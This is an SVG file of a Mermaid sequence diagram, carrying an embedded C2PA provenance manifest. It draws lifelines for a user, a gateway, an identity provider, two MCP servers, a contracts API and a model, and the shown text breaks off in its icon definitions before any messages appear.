<svg id="my-svg" width="100%" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="max-width: 2025.5px; background-color: transparent;" viewBox="-50 -10 2025.5 1373" role="graphics-document document" aria-roledescription="sequence" xmlns:c2pa="http://c2pa.org/manifest"><metadata><c2pa:manifest>AAAWgmp1bWIAAAAeanVtZGMycGEAEQAQgAAAqgA4m3EDYzJwYQAAABZcanVtYgAAAEdqdW1kYzJtYQARABCAAACqADibcQN1cm46YzJwYTpmOGM4N2Q1NC0wYjFlLTQ3YTMtODljNC1lYmNmYWY1NTg4YjEAAAADl2p1bWIAAAApanVtZGMyYXMAEQAQgAAAqgA4m3EDYzJwYS5hc3NlcnRpb25zAAAAALxqdW1iAAAARGp1bWRjYm9yABEAEIAAAKoAOJtxE2MycGEuaW5ncmVkaWVudC52MwAAAAAYYzJzaI0Mk4JpjBtsPXn5oCBRjtkAAABwY2JvcqNpZGM6Zm9ybWF0bWltYWdlL3N2Zyt4bWxqaW5zdGFuY2VJRHgseG1wOmlpZDo4MGZhYWU2ZS04NDdhLTQ4N2UtODdmMS05MWQ0OWM0ZjljMzFscmVsYXRpb25zaGlwaHBhcmVudE9mAAAB4mp1bWIAAABBanVtZGNib3IAEQAQgAAAqgA4m3ETYzJwYS5hY3Rpb25zLnYyAAAAABhjMnNozurHhQyWDngAdRxozu4SsAAAAZljYm9yomdhY3Rpb25zgqJmYWN0aW9ua2MycGEub3BlbmVkanBhcmFtZXRlcnOha2luZ3JlZGllbnRzgaJjdXJseC1zZWxmI2p1bWJmPWMycGEuYXNzZXJ0aW9ucy9jMnBhLmluZ3JlZGllbnQudjNkaGFzaFggeDF8sftSqHJjbjIxjI34fE0hVPJbnPyIVZM+q6eoSsWkZmFjdGlvbngdY29tLmFudGhyb3BpYy5jbGF1ZGUucHJvdmlkZWRqcGFyYW1ldGVyc6F4H2NvbS5hbnRocm9waWMub3JpZ2luLWNvbmZpZGVuY2VndW5rbm93bmtkZXNjcmlwdGlvbnhmQ2xhdWRlIHByb3ZpZGVkIHRoaXMgZmlsZSBhdCB0aGUgcmVxdWVzdCBvZiBhIHVzZXIgYW5kIG1heSBoYXZlIGNyZWF0ZWQgb3IgbW9kaWZpZWQgdGhlIGZpbGUgY29udGVudHMubXNvZnR3YXJlQWdlbnShZG5hbWVmQ2xhdWRlcmFsbEFjdGlvbnNJbmNsdWRlZPUAAADIanVtYgAAAEBqdW1kY2JvcgARABCAAACqADibcRNjMnBhLmhhc2guZGF0YQAAAAAYYzJzaNnq+HDGnI/viqqQWLIjJaAAAACAY2JvcqVjYWxnZnNoYTI1NmNwYWRMAAAAAAAAAAAAAAAAZGhhc2hYIInchxX4iiC1iS7qlvuSgiTEmb2ub2u6xzsWQLE4M3ZPZG5hbWVuanVtYmYgbWFuaWZlc3RqZXhjbHVzaW9uc4GiZXN0YXJ0GQFHZmxlbmd0aBkeBAAAAj5qdW1iAAAAJ2p1bWRjMmNsABEAEIAAAKoAOJtxA2MycGEuY2xhaW0udjIAAAACD2Nib3KlY2FsZ2ZzaGEyNTZpc2lnbmF0dXJleE1zZWxmI2p1bWJmPS9jMnBhL3VybjpjMnBhOmY4Yzg3ZDU0LTBiMWUtNDdhMy04OWM0LWViY2ZhZjU1ODhiMS9jMnBhLnNpZ25hdHVyZWppbnN0YW5jZUlEeCx4bXA6aWlkOmQyNjNlZTcxLTE0MGUtNGI5ZC1iOTc4LTg4OWM0YmJiZjMxNnJjcmVhdGVkX2Fzc2VydGlvbnODomN1cmx4LXNlbGYjanVtYmY9YzJwYS5hc3NlcnRpb25zL2MycGEuaW5ncmVkaWVudC52M2RoYXNoWCB4MXyx+1KocmNuMjGMjfh8TSFU8luc/IhVkz6rp6hKxaJjdXJseCpzZWxmI2p1bWJmPWMycGEuYXNzZXJ0aW9ucy9jMnBhLmFjdGlvbnMudjJkaGFzaFggAIVOa8kliyQylE3MMIk94F7Ka8KDE23hzjsKh6kcCUOiY3VybHgpc2VsZiNqdW1iZj1jMnBhLmFzc2VydGlvbnMvYzJwYS5oYXNoLmRhdGFkaGFzaFggV/YBnbgd9pOWI1RLQ2PfjmDNrdbDUIkGTCVFWyoFl310Y2xhaW1fZ2VuZXJhdG9yX2luZm+jZG5hbWVvQW50aHJvcGljIEZpbGVzZ3ZlcnNpb25lMS4wLjBrc3BlY1ZlcnNpb25lMi40LjAAABA4anVtYgAAAChqdW1kYzJjcwARABCAAACqADibcQNjMnBhLnNpZ25hdHVyZQAAABAIY2JvctKEWQISogEmGCFZAgowggIGMIIBjaADAgECAhRA5aAK7sI50L64g/oGQgU9Z1UTADAKBggqhkjOPQQDAzBJMRcwFQYDVQQKEw5BbnRocm9waWMsIFBCQzEuMCwGA1UEAxMlQW50aHJvcGljIENvbnRlbnQgQ3JlZGVudGlhbHMgUm9vdCBDQTAeFw0yNjA4MDcxODQzNTZaFw0yODA4MDYxOTQzNTZaMEQxFzAVBgNVBAoTDkFudGhyb3BpYywgUEJDMSkwJwYDVQQDEyBBbnRocm9waWMgQ2xhdWRlIENvbnRlbnQgU2lnbmluZzBZMBMGByqGSM49AgEGCCqGSM49AwEHA0IABJh6CmvLUBgFFNU0vUKlOVtE6djd17L5SuwX0LemFisBM3dkd/3cyjxFA3Qo5S46fX0/ihY0VZ7mfb9KF703t5OjWDBWMA4GA1UdDwEB/wQEAwIHgDAVBgNVHSUEDjAMBgorBgEEAYPoXgIBMAwGA1UdEwEB/wQCMAAwHwYDVR0jBBgwFoAUzlHiBIFOZFsj+OPEz5o+nMHXXMIwCgYIKoZIzj0EAwMDZwAwZAIwMXMdFJ4BetLLVY7ORuE9noqbbAZOZn/aArXyTwFAZfKrPzxF2vPoJNf1+UCdg1XGAjBwX1zd9WGqYkqmL5SFqw1QySjr1zJfpJM9+1rdDwSPLMOPOjKuiXjoU/pUUeG9RwmhY3BhZFkNngAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPZYQAgYz4L3jkDg59NGxSKMhR2/W8YZo2Jnbow1alGicVpCzrAmIrWzGk91m+pNfZhv7Bq9YNG0wt7I17CQWQvLwUU=</c2pa:manifest></metadata><g><rect x="1722.5" y="1287" fill="#eaeaea" stroke="#666" width="150" height="65" name="MT" rx="3" ry="3" class="actor actor-bottom"/><text x="1797.5" y="1319.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="1797.5" dy="0">mcp-tickets :8093</tspan></text></g><g><rect x="1522.5" y="1287" fill="#eaeaea" stroke="#666" width="150" height="65" name="M" rx="3" ry="3" class="actor actor-bottom"/><text x="1597.5" y="1319.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="1597.5" dy="0">model</tspan></text></g><g><rect x="1322.5" y="1287" fill="#eaeaea" stroke="#666" width="150" height="65" name="API" rx="3" ry="3" class="actor actor-bottom"/><text x="1397.5" y="1319.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="1397.5" dy="0">contracts-api :8091</tspan></text></g><g><rect x="991" y="1287" fill="#eaeaea" stroke="#666" width="151" height="65" name="MC" rx="3" ry="3" class="actor actor-bottom"/><text x="1066.5" y="1319.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="1066.5" dy="0">mcp-contracts :8092</tspan></text></g><g><rect x="791" y="1287" fill="#eaeaea" stroke="#666" width="150" height="65" name="I" rx="3" ry="3" class="actor actor-bottom"/><text x="866" y="1319.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="866" dy="0">idp :8081</tspan></text></g><g><rect x="358" y="1287" fill="#eaeaea" stroke="#666" width="150" height="65" name="G" rx="3" ry="3" class="actor actor-bottom"/><text x="433" y="1319.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="433" dy="0">gateway :8080</tspan></text></g><g><rect x="0" y="1287" fill="#eaeaea" stroke="#666" width="150" height="65" name="U" rx="3" ry="3" class="actor actor-bottom"/><text x="75" y="1319.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="75" dy="0">alice</tspan></text></g><g><line id="actor6" x1="1797.5" y1="65" x2="1797.5" y2="1287" class="actor-line 200" stroke-width="0.5px" stroke="#999" name="MT" data-et="life-line" data-id="MT"/><g id="root-6" data-et="participant" data-type="participant" data-id="MT"><rect x="1722.5" y="0" fill="#eaeaea" stroke="#666" width="150" height="65" name="MT" rx="3" ry="3" class="actor actor-top"/><text x="1797.5" y="32.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="1797.5" dy="0">mcp-tickets :8093</tspan></text></g></g><g><line id="actor5" x1="1597.5" y1="65" x2="1597.5" y2="1287" class="actor-line 200" stroke-width="0.5px" stroke="#999" name="M" data-et="life-line" data-id="M"/><g id="root-5" data-et="participant" data-type="participant" data-id="M"><rect x="1522.5" y="0" fill="#eaeaea" stroke="#666" width="150" height="65" name="M" rx="3" ry="3" class="actor actor-top"/><text x="1597.5" y="32.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="1597.5" dy="0">model</tspan></text></g></g><g><line id="actor4" x1="1397.5" y1="65" x2="1397.5" y2="1287" class="actor-line 200" stroke-width="0.5px" stroke="#999" name="API" data-et="life-line" data-id="API"/><g id="root-4" data-et="participant" data-type="participant" data-id="API"><rect x="1322.5" y="0" fill="#eaeaea" stroke="#666" width="150" height="65" name="API" rx="3" ry="3" class="actor actor-top"/><text x="1397.5" y="32.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="1397.5" dy="0">contracts-api :8091</tspan></text></g></g><g><line id="actor3" x1="1066.5" y1="65" x2="1066.5" y2="1287" class="actor-line 200" stroke-width="0.5px" stroke="#999" name="MC" data-et="life-line" data-id="MC"/><g id="root-3" data-et="participant" data-type="participant" data-id="MC"><rect x="991" y="0" fill="#eaeaea" stroke="#666" width="151" height="65" name="MC" rx="3" ry="3" class="actor actor-top"/><text x="1066.5" y="32.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="1066.5" dy="0">mcp-contracts :8092</tspan></text></g></g><g><line id="actor2" x1="866" y1="65" x2="866" y2="1287" class="actor-line 200" stroke-width="0.5px" stroke="#999" name="I" data-et="life-line" data-id="I"/><g id="root-2" data-et="participant" data-type="participant" data-id="I"><rect x="791" y="0" fill="#eaeaea" stroke="#666" width="150" height="65" name="I" rx="3" ry="3" class="actor actor-top"/><text x="866" y="32.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="866" dy="0">idp :8081</tspan></text></g></g><g><line id="actor1" x1="433" y1="65" x2="433" y2="1287" class="actor-line 200" stroke-width="0.5px" stroke="#999" name="G" data-et="life-line" data-id="G"/><g id="root-1" data-et="participant" data-type="participant" data-id="G"><rect x="358" y="0" fill="#eaeaea" stroke="#666" width="150" height="65" name="G" rx="3" ry="3" class="actor actor-top"/><text x="433" y="32.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="433" dy="0">gateway :8080</tspan></text></g></g><g><line id="actor0" x1="75" y1="65" x2="75" y2="1287" class="actor-line 200" stroke-width="0.5px" stroke="#999" name="U" data-et="life-line" data-id="U"/><g id="root-0" data-et="participant" data-type="participant" data-id="U"><rect x="0" y="0" fill="#eaeaea" stroke="#666" width="150" height="65" name="U" rx="3" ry="3" class="actor actor-top"/><text x="75" y="32.5" dominant-baseline="central" alignment-baseline="central" class="actor actor-box" style="text-anchor: middle; font-size: 16px; font-weight: 400;"><tspan x="75" dy="0">alice</tspan></text></g></g><style>#my-svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;fill:#ccc;}@keyframes edge-animation-frame{from{stroke-dashoffset:0;}}@keyframes dash{to{stroke-dashoffset:0;}}#my-svg .edge-animation-slow{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 50s linear infinite;stroke-linecap:round;}#my-svg .edge-animation-fast{stroke-dasharray:9,5!important;stroke-dashoffset:900;animation:dash 20s linear infinite;stroke-linecap:round;}#my-svg .error-icon{fill:#a44141;}#my-svg .error-text{fill:#ddd;stroke:#ddd;}#my-svg .edge-thickness-normal{stroke-width:1px;}#my-svg .edge-thickness-thick{stroke-width:3.5px;}#my-svg .edge-pattern-solid{stroke-dasharray:0;}#my-svg .edge-thickness-invisible{stroke-width:0;fill:none;}#my-svg .edge-pattern-dashed{stroke-dasharray:3;}#my-svg .edge-pattern-dotted{stroke-dasharray:2;}#my-svg .marker{fill:lightgrey;stroke:lightgrey;}#my-svg .marker.cross{stroke:lightgrey;}#my-svg svg{font-family:"trebuchet ms",verdana,arial,sans-serif;font-size:16px;}#my-svg p{margin:0;}#my-svg .actor{stroke:#ccc;fill:#1f2020;stroke-width:1;}#my-svg rect.actor.outer-path[data-look="neo"]{filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg rect.note[data-look="neo"]{stroke:hsl(180, 0%, 18.3529411765%);fill:hsl(180, 1.5873015873%, 28.3529411765%);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg text.actor&gt;tspan{fill:lightgrey;stroke:none;}#my-svg .actor-line{stroke:#ccc;}#my-svg .innerArc{stroke-width:1.5;stroke-dasharray:none;}#my-svg .messageLine0{stroke-width:1.5;stroke-dasharray:none;stroke:lightgrey;}#my-svg .messageLine1{stroke-width:1.5;stroke-dasharray:2,2;stroke:lightgrey;}#my-svg [id$="-arrowhead"] path{fill:lightgrey;stroke:lightgrey;}#my-svg .sequenceNumber{fill:black;}#my-svg [id$="-sequencenumber"]{fill:lightgrey;}#my-svg [id$="-crosshead"] path{fill:lightgrey;stroke:lightgrey;}#my-svg .messageText{fill:lightgrey;stroke:none;}#my-svg .labelBox{stroke:#ccc;fill:#1f2020;filter:none;}#my-svg .labelText,#my-svg .labelText&gt;tspan{fill:lightgrey;stroke:none;}#my-svg .loopText,#my-svg .loopText&gt;tspan{fill:lightgrey;stroke:none;}#my-svg .sectionTitle,#my-svg .sectionTitle&gt;tspan{fill:lightgrey;stroke:none;}#my-svg .loopLine{stroke-width:2px;stroke-dasharray:2,2;stroke:#ccc;fill:#ccc;}#my-svg .note{stroke:hsl(180, 0%, 18.3529411765%);fill:hsl(180, 1.5873015873%, 28.3529411765%);}#my-svg .noteText,#my-svg .noteText&gt;tspan{fill:rgb(183.8476190475, 181.5523809523, 181.5523809523);stroke:none;font-weight:normal;}#my-svg .activation0{fill:hsl(180, 1.5873015873%, 28.3529411765%);stroke:#ccc;}#my-svg .activation1{fill:hsl(180, 1.5873015873%, 28.3529411765%);stroke:#ccc;}#my-svg .activation2{fill:hsl(180, 1.5873015873%, 28.3529411765%);stroke:#ccc;}#my-svg .actorPopupMenu{position:absolute;}#my-svg .actorPopupMenuPanel{position:absolute;fill:#1f2020;box-shadow:0px 8px 16px 0px rgba(0,0,0,0.2);filter:drop-shadow(3px 5px 2px rgb(0 0 0 / 0.4));}#my-svg .actor-man circle,#my-svg line{fill:#1f2020;stroke-width:2px;}#my-svg g rect.rect{filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));stroke:#ccc;}#my-svg .node .neo-node{stroke:#ccc;}#my-svg [data-look="neo"].node rect,#my-svg [data-look="neo"].cluster rect,#my-svg [data-look="neo"].node polygon{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].swimlane.cluster rect{filter:none;}#my-svg [data-look="neo"].node path{stroke:url(#my-svg-gradient);stroke-width:1px;}#my-svg [data-look="neo"].node .outer-path{filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].node .neo-line path{stroke:#ccc;filter:none;}#my-svg [data-look="neo"].node circle{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].node circle .state-start{fill:#000000;}#my-svg [data-look="neo"].icon-shape .icon{fill:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg [data-look="neo"].icon-shape .icon-neo path{stroke:url(#my-svg-gradient);filter:drop-shadow( 1px 2px 2px rgba(185,185,185,1));}#my-svg :root{--mermaid-font-family:"trebuchet ms",verdana,arial,sans-serif;}</style><g/><defs><symbol id="my-svg-computer" width="24" height="24"><path transform="scale(.5)" d="M2 2v13h20v-13h-20zm18 11h-16v-9h16v9zm-10.228 6l.466-1h3.524l.467 1h-4.457zm14.228 3h-24l2-6h2.104l-1.33 4h18.45l-1.297-4h2.073l2 6zm-5-10h-14v-7h14v7z"/></symbol></defs><defs><symbol id="my-svg-database" fill-rule="evenodd" clip-rule="evenodd"><path transform="scale(.5)" d="M12.258.001l.256.004.255.005.253.008.251.01.249.012.247.015.246.016.242.019.241.02.239.023.236.024.233.027.231.028.229.031.225.032.223.034.22.036.217.038.214.04.211.041.208.043.205.045.201.046.198.048.194.05.191.051.187.053.183.054.18.056.175.057.172.059.168.06.163.061.16.063.155.064.15.066.074.033.073.033.071.034.07.034.069.035.068.035.067.035.066.035.064.036.064.036.062.036.06.036.06.037.058.037.058.037.055.038.055.038.053.038.052.038.051.039.05.039.048.039.047.039.045.04.044.04.043.04.041.04.04.041.039.041.037.041.036.041.034.041.033.042.032.042.03.042.029.042.027.042.026.043.024.043.023.043.021.043.02.043.018.044.017.043.015.044.013.044.012.044.011.045.009.044.007.045.006.045.004.045.002.045.001.045v17l-.001.045-.002.045-.004.045-.006.045-.007.045-.009.044-.011.045-.012.044-.013.044-.015.044-.017.043-.018.044-.02.043-.021.043-.023.043-.024.043-.026.043-.027.042-.029.042-.03.042-.032.042-.033.042-.034.041-.036.041-.037.041-.039.041-.04.041-.041.04-.043.04-.044.04-.045.04-.047.039-.048.039-.05.039-.051.039-.052.038-.053.038-.055.038-.055.038-.058.037-.058.037-.06.037-.06.036-.062.036-.064.036-.064.036-.066.035-.067.035-.068.035-.069.035-.07.034-.071.034-.073.033-.074.033-.15.066-.155.064-.16.063-.163.061-.168.06-.172.059-.175.057-.18.056-.183.054-.187.053-.191.051-.194.05-.198.048-.201.046-.205.045-.208.043-.211.041-.214.04-.217.038-.22.036-.223.034-.225.032-.229.031-.231.028-.233.027-.236.024-.239.023-.241.02-.242.019-.246.016-.247.015-.249.012-.251.01-.253.008-.255.005-.256.004-.258.001-.258-.001-.256-.004-.255-.005-.253-.008-.251-.01-.249-.012-.247-.015-.245-.016-.243-.019-.241-.02-.238-.023-.236-.024-.234-.027-.231-.028-.228-.031-.226-.032-.223-.034-.22-.036-.217-.038-.214-.04-.211-.041-.208-.043-.204-.045-.201-.046-.198-.048-.195-.05-.19-.051-.187-.053-.184-.054-.179-.056-.176-.057-.172-.059-.167-.06-.164-.061-.159-.063-.155-.064-.151-.066-.074-.033-.072-.033-.072-.034-.07-.034-.069-.035-.068-.035-.067-.035-.066-.035-.064-.036-.063-.036-.062-.036-.061-.036-.06-.037-.058-.037-.057-.037-.056-.038-.055-.038-.053-.038-.052-.038-.051-.039-.049-.039-.049-.039-.046-.039-.046-.04-.044-.04-.043-.04-.041-.04-.04-.041-.039-.041-.037-.041-.036-.041-.034-.041-.033-.042-.032-.042-.03-.042-.029-.042-.027-.042-.026-.043-.024-.043-.023-.043-.021-.043-.02-.043-.018-.044-.017-.043-.015-.044-.013-.044-.012-.044-.011-.045-.009-.044-.007-.045-.006-.045-.004-.045-.002-.045-.001-.045v-17l.001-.045.002-.045.004-.045.006-.045.007-.045.009-.044.011-.045.012-.044.013-.044.015-.044.017-.043.018-.044.02-.043.021-.043.023-.043.024-.043.026-.043.027-.042.029-.042.03-.042.032-.042.033-.042.034-.041.036-.041.037-.041.039-.041.04-.041.041-.04.043-.04.044-.04.046-.04.046-.039.049-.039.049-.039.051-.039.052-.038.053-.038.055-.038.056-.038.057-.037.058-.037.06-.037.061-.036.062-.036.063-.036.064-.036.066-.035.067-.035.